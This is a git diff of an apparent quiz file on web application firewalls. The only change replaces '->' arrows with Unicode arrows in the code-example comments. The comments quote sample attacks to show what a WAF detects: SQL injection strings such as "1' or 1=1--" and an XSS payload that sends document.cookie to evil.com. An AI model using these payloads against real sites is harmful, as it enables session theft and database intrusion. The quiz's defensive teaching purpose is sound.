@@ -7,8 +7,8 @@ const questions = [
     hint: "Network firewalls check IP/ports; WAFs check HTTP web payloads and code injections.",
     level: "Basic",
     codeExample: `// Network Firewall vs WAF Comparison:
-// Network Firewall Check: "Is Port 443 permitted from IP 203.0.113.10?" -> YES (Passes exploit!)
-// WAF Layer 7 Check      : "Does the parameter contain 'UNION SELECT'?"  -> YES -> ACTION: HTTP 403 FORBIDDEN!`
+// Network Firewall Check: "Is Port 443 permitted from IP 203.0.113.10?" → YES (Passes exploit!)
+// WAF Layer 7 Check      : "Does the parameter contain 'UNION SELECT'?"  → YES → ACTION: HTTP 403 FORBIDDEN!`
   },
   {
     id: 2,
@@ -18,7 +18,7 @@ const questions = [
     hint: "Web attacks ride on legitimate open web ports like 443 that network firewalls leave open.",
     level: "Basic",
     codeExample: `// Web Exploit on Open Port:
-// TCP Packet: SYN -> SYN-ACK -> ACK -> Valid TLS 1.3 Session on Port 443
+// TCP Packet: SYN → SYN-ACK → ACK → Valid TLS 1.3 Session on Port 443
 // Payload: <script>document.location='http://evil.com?c='+document.cookie</script>`
   },
   {
@@ -29,9 +29,9 @@ const questions = [
     hint: "Adding up points for every suspicious pattern and blocking only if the total score exceeds the limit.",
     level: "Moderate",
     codeExample: `// OWASP CRS Collaborative Anomaly Scoring:
-// Rule 942100 (SQLi Keyword)     -> Score +5
+// Rule 942100 (SQLi Keyword)     → Score +5
 // Rule 920100 (Missing User-Agent)-> Score +3
-// Total Score: 8 >= Threshold 5 -> Action: HTTP 403 Forbidden!`
+// Total Score: 8 >= Threshold 5 → Action: HTTP 403 Forbidden!`
   },
   {
     id: 4,
@@ -53,7 +53,7 @@ const questions = [
     level: "Moderate",
     codeExample: `// OpenAPI / Positive WAF Schema:
 // "account_id": { "type": "integer", "minimum": 100000, "maximum": 999999 }
-// Input: "100452' OR 1=1--" -> REJECTED: Failed integer schema validation!`
+// Input: "100452' OR 1=1--" → REJECTED: Failed integer schema validation!`
   },
   {
     id: 6,
@@ -63,7 +63,7 @@ const questions = [
     hint: "Parses input like a real SQL compiler to understand the actual meaning of the code.",
     level: "Expert",
     codeExample: `// Libinjection Tokenization:
-// Input: "1' or 1=1--" -> Tokens: [1] (Literal), ['] (Quote), [or] (Logic Operator), [1=1] (Tautology)
+// Input: "1' or 1=1--" → Tokens: [1] (Literal), ['] (Quote), [or] (Logic Operator), [1=1] (Tautology)
 // Verdict: SQLi Syntax Tree Confirmed!`
   },
   {
@@ -147,7 +147,7 @@ const questions = [
     hint: "Cryptographically signing cookies so users cannot alter their permissions in the browser.",
     level: "Moderate",
     codeExample: `// WAF Cookie Encryption & Signing:
-// Set-Cookie: session_id=9821.HMAC_SIG_a89f31b -> Tampered cookie rejected by WAF with HTTP 403!`
+// Set-Cookie: session_id=9821.HMAC_SIG_a89f31b → Tampered cookie rejected by WAF with HTTP 403!`
   },
   {
     id: 15,
